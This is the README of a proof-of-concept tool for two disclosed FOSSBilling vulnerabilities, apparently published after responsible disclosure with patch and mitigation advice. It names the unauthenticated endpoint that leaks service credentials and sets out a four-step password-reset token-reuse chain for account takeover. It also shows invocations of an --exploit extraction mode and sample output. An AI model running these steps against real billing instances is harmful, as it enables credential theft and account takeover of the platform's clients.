<div align="center">

```
 ███████╗ ██████╗ ███████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 █████╗  ██║   ██║███████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ██╔══╝  ██║   ██║╚════██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ██║     ╚██████╔╝███████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
```

**made by [7megaumka7](https://github.com/7megaumka7)**

PoC tool for two accepted GitHub Security Advisory vulnerabilities in [FOSSBilling](https://fossbilling.org/) ≤ 0.7.2

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![CVE-2026-53647](https://img.shields.io/badge/CVE--2026--53647-Moderate%206.9-orange?style=flat-square)](https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-737q-9gpr-6mpq)
[![CVE-2026-53646](https://img.shields.io/badge/CVE--2026--53646-High%207.7-red?style=flat-square)](https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-vp66-w6rc-x32p)

</div>

---

## Table of Contents

- [Introduction](#introduction)
- [Vulnerabilities](#vulnerabilities)
  - [CVE-2026-53647 — Unauthenticated API Key Config Disclosure](#cve-2026-53647--unauthenticated-api-key-config-disclosure)
  - [CVE-2026-53646 — Password Reset Token Reuse](#cve-2026-53646--password-reset-token-reuse)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
  - [Flags](#flags)
  - [Modes](#modes)
  - [Examples](#examples)
- [Sample Output](#sample-output)
- [Remediation](#remediation)
- [Responsible Disclosure](#responsible-disclosure)
- [Legal Disclaimer](#legal-disclaimer)
- [Credits](#credits)

---

## Introduction

**FOSKiller** is a proof-of-concept tool demonstrating two security vulnerabilities in
[FOSSBilling](https://fossbilling.org/) — an open-source billing and client management
platform. Both vulnerabilities were responsibly disclosed through the GitHub Security
Advisory program and are fully patched in FOSSBilling **0.7.3+**.

The tool is intended for:
- Security researchers verifying their own FOSSBilling installations
- Penetration testers conducting authorized engagements
- Defenders confirming patch application

| Advisory | CVE | Type | CVSS | Affected |
|---|---|---|---|---|
| [GHSA-737q-9gpr-6mpq](https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-737q-9gpr-6mpq) | CVE-2026-53647 | Unauthenticated API Key Config Disclosure | **6.9 Moderate** | >= 0.5.3, <= 0.7.2 |
| [GHSA-vp66-w6rc-x32p](https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-vp66-w6rc-x32p) | CVE-2026-53646 | Password Reset Token Reuse → Account Takeover | **7.7 High** | >= 0.5.6, <= 0.7.2 |

---

## Vulnerabilities

### CVE-2026-53647 — Unauthenticated API Key Config Disclosure

The guest endpoint `/api/guest/serviceapikey/get_info` returns the full service
configuration — including `custom_*` fields, API credentials, hostnames, and passwords —
without requiring any authentication. An attacker who knows or enumerates a valid API
key can retrieve complete backend service configuration from a public endpoint.

**Impact:** Exposure of service credentials, internal hostnames, API secrets.

### CVE-2026-53646 — Password Reset Token Reuse

When a client triggers two consecutive password resets for the same account, the
application issues a new token but does **not invalidate the previous one**. An attacker
who previously captured the first token can use it to set a new password even after the
legitimate user completes their own reset flow.

**Attack chain:**

```
1. Attacker triggers POST /api/guest/client/reset_password → captures token T1
2. Victim triggers their own reset → app issues T2, T1 remains valid
3. Attacker calls POST /api/guest/client/update_password?hash=T1 with chosen password
4. Attacker has persistent access regardless of victim's reset completion
```

**Impact:** Persistent account takeover of any client whose reset email is interceptable.

---

## Requirements

- Python **3.8+**
- [`requests`](https://pypi.org/project/requests/)
- [`colorama`](https://pypi.org/project/colorama/)

> If dependencies are missing, the script detects this on startup and offers to install them automatically.

---

## Installation

**Clone and install dependencies:**

```bash
git clone https://github.com/7megaumka7/FOSKiller.git
cd FOSKiller
pip install -r requirements.txt
```

**Or run without pre-installing** — the script will prompt to install missing packages on first run.

---

## Usage

```
python fossbilling_poc.py --target URL [--key KEY] [--email EMAIL]
                          [--check-only | --exploit]
                          [--force] [--output FILE]
                          [--timeout SEC] [--proxy URL]
```

### Flags

| Flag | Required | Description |
|---|---|---|
| `--target URL` | Yes | Base URL of the FOSSBilling instance |
| `--key KEY` | For CVE-2026-53647 | API key to test |
| `--email EMAIL` | For CVE-2026-53646 | Client email to test |
| `--check-only` | No | Detection mode — confirm vulnerability without extracting data |
| `--exploit` | No | Full extraction + attack chain documentation |
| `--force` | No | Skip version range check |
| `--output FILE` | No | Save full results to a JSON file |
| `--timeout SEC` | No | HTTP timeout in seconds (default: `10`) |
| `--proxy URL` | No | HTTP proxy (e.g. `http://127.0.0.1:8080`) |

`--check-only` and `--exploit` are mutually exclusive.

### Modes

| Mode | Flag | What it does |
|---|---|---|
| **Detection** | `--check-only` | Confirms the vulnerability exists. Does not display or extract sensitive values. |
| **Default** | *(no mode flag)* | Confirms status and shows basic evidence. |
| **Exploitation** | `--exploit` | Extracts all leaked fields; documents full account-takeover chain with timing metadata. |

### Examples

**Detection only — verify both CVEs without extracting data:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --email client@example.com \
  --check-only
```

**Full extraction and attack chain documentation:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --email client@example.com \
  --exploit
```

**Save results to JSON and route through Burp Suite:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --email client@example.com \
  --output results.json \
  --proxy http://127.0.0.1:8080
```

**Test an unknown or already-patched version:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --force
```

---

## Sample Output

```
[*] Probing https://billing.example.com …
[+] Detected version: 0.7.1
[+] CVE-2026-53647 affected range (>=0.5.3 <=0.7.2): YES
[+] CVE-2026-53646 affected range (>=0.5.6 <=0.7.2): YES

── CVE-2026-53647 │ Unauthenticated API Key Config Disclosure ─────────
[*] Target  : https://billing.example.com/api/guest/serviceapikey/get_info?key=***
[*] Mode    : Full extraction
[*] HTTP    : 200
[+] VULNERABLE — endpoint returned 4 sensitive field(s) without authentication

  Field                          Value
  ──────────────────────────────────────────────────────────────────────
  custom_hostname                db.internal.example.com
  custom_username                fossbilling_db
  custom_password                [REDACTED IN THIS EXAMPLE]
  custom_api_secret              [REDACTED IN THIS EXAMPLE]

── CVE-2026-53646 │ Password Reset Token Reuse / Account Takeover ─────
[*] Sending reset request #1 …
[*]   HTTP 200  |  142 ms  |  2026-06-12T10:00:00.000Z
[*] Sending reset request #2 (same email) …
[*]   HTTP 200  |  138 ms  |  2026-06-12T10:00:01.000Z
[*]   Time delta between requests : 0.643s
[!] Both reset requests succeeded — endpoint accepts repeated resets without rate-limiting.

── Summary ─────────────────────────────────────────────────────────────

  CVE                  GHSA                         Severity               Status
  ──────────────────────────────────────────────────────────────────────────────────
  CVE-2026-53647       GHSA-737q-9gpr-6mpq          Moderate (CVSS 6.9)    VULNERABLE
  CVE-2026-53646       GHSA-vp66-w6rc-x32p          High (CVSS 7.7)        POTENTIALLY_VULNERABLE
```

---

## Remediation

**Upgrade to FOSSBilling >= 0.7.3**, which addresses both vulnerabilities.

If immediate patching is not possible:

| CVE | Interim Mitigation |
|---|---|
| CVE-2026-53647 | Block access to `/api/guest/serviceapikey/` at the web server or WAF level |
| CVE-2026-53646 | Implement token invalidation on re-issue; add rate-limiting to the reset endpoint |

---

## Responsible Disclosure

Both vulnerabilities were reported to the FOSSBilling maintainers through the
GitHub Security Advisory program prior to this publication.

- Advisory 1: https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-737q-9gpr-6mpq
- Advisory 2: https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-vp66-w6rc-x32p

---

## Legal Disclaimer

> **This tool is provided for educational purposes and authorized security testing only.**
>
> Only use this tool against systems you own or have received **explicit written permission** to test.
> Unauthorized use against third-party systems is illegal under the Computer Fraud and Abuse Act (CFAA),
> the Computer Misuse Act, and equivalent legislation worldwide.
>
> The author assumes **no responsibility** for misuse, damage, or legal consequences arising from
> the use of this tool. By using this tool you agree that you are solely responsible for your actions.

---

## Credits

**Researcher & Author:** [7megaumka7](https://github.com/7megaumka7)

Vulnerability discovery, analysis, responsible disclosure, and tool development.
